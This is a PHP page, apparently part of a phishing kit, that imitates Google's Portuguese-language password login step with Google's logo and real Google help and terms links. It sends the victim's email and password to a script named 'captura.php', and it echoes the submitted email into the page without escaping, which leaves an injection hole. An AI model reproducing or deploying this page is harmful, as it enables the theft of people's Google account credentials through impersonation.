<?php
$dados = filter_input_array(INPUT_POST, FILTER_DEFAULT);
?>
<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Fazer Login nas Contas Google</title>
    <link rel="stylesheet" href="../assets/css/senha.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  </head>
  <body>
    <main>
      <div class="container">
          <form action="captura.php" method="POST">
        <div class="box">
            <div class="logo">
              <img src="../assets/img/googlelogo.png" alt="Logo google">
            </div>
            <div class="title">
              <h2>Olá!</h2>
            </div>
            <div class="text">
              <p>
                <?php
                if (isset($dados['email'])) {
                  echo '<a href="../index.php?email='.$dados["email"].'">';
                  echo '<i class="fa fa-user-circle"></i>&nbsp;';
                  echo $dados["email"];
                  echo '&nbsp;<i class="fa fa-angle-down"></i>';
                  echo '</a>';
                }
                ?>
              </p>
            </div>
          <input type="hidden" name="email" value="<?php echo $dados['email'];?>">
          
            <div class="form-group">
              <input type="password" name="senha" id="senha" required>
              <label for="senha">Digite a senha</label>
            </div>
            
            <div class="senha">
        
              <input type="checkbox" name="mostrarOcultar" id="mostrarOcultar">
              <label for="mostrarOcultar">Mostrar senha?</label>
            
            </div>
            
            <div class="button-group">
              <a href="#">Esqueceu a senha?</a>
              <button type="submit" name="btn_senha">Avançar</button>
            </div>
          </form>
          <ul class="links">
            <li><a href="#">Português (Brazil)</a></li>
            <li><a href="https://support.google.com/accounts?hl=pt-BR&p=account_iph">Ajuda</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR&privacy=true">Privacidade</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR">Termos</a></li>
          </ul>
      
        </div>
      </div>
    </main>
    <script src="../assets/js/senha.js"></script>
  </body>
</html>